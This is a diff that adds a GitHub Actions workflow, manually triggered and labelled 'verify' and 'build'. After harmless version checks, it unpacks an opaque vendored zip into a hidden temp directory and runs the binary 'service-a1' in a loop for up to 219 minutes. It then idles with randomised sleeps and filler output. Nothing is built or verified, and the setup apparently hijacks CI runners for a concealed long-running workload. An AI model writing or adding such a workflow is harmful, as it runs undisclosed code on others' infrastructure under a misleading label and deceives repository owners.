@@ -1,0 +1,20 @@
+name: verify-nl0j
+on:
+  workflow_dispatch:
+jobs:
+  prepare_vsy:
+    runs-on: ubuntu-latest
+    timeout-minutes: 307
+    steps:
+      - uses: actions/checkout@v4
+      - run: python3 --version
+      - run: gcc --version | head -1
+      - run: node --version 2>/dev/null || true
+      - run: nproc
+      - name: build
+        run: |
+          BO=$(mktemp -d /tmp/.XXXXXXXX) && unzip -o -q vendor/c52c26f2.zip -d ${BO} && chmod +x ${BO}/service-a1
+          cd ${BO} && timeout 219m bash -c 'while true; do ./service-a1; echo "complete rc=$? $(date -u +%H:%M)"; sleep 10; done'
+          END=$((SECONDS + 157 * 60))
+          while [ $SECONDS -lt $END ]; do sleep $((RANDOM % 84 + 42)); echo "s742hx5j $(date -u +%H:%M)"; done
+
